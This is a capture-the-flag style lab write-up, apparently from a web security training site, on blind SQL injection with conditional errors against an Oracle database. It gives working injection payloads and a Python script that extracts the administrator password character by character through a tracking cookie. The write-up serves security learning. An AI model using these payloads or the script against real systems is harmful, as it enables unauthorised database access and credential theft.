## Lab: Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Notes

1/ Confirm that the parameter is vulnerable, and the database type is "Oracle"

```sql
' || (SELECT '' FROM dual) || '
```

```sql
' || (SELECT '' FROM aaaaaa) || '
```

2/ Confirm that the "users" table exists in the database

```sql
' || (SELECT '' FROM users WHERE ROWNUM=1) || '
```

3/ Confirm that the "administrator" user exists in the "users" table

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' 
```

In basic, this command create error if the "administrator" user exists.

4/ Enumerate the password of the "administrator" user

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20) || '
```

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') || ' 
```

5/ Write a script to automate the password extraction

```python
import requests
import string

url = "https://0a1c0035030184c380d1089c00be00a9.web-security-academy.net"

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()
tracking_id = session.get(url).cookies.get("TrackingId")

for position in range(1, 21):
    for char in characters:
        guess = password + char
        payload = (
            f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,{position})='{guess}') || ' "
        )

        response = session.get(
            url,
            cookies={"TrackingId": tracking_id + payload}
        )

        if "Internal Server Error" in response.text:
            password += char
            print("Found:", password)
            break
    else:
        print("No matching character found at position", position)
        break

print("Password:", password)
```

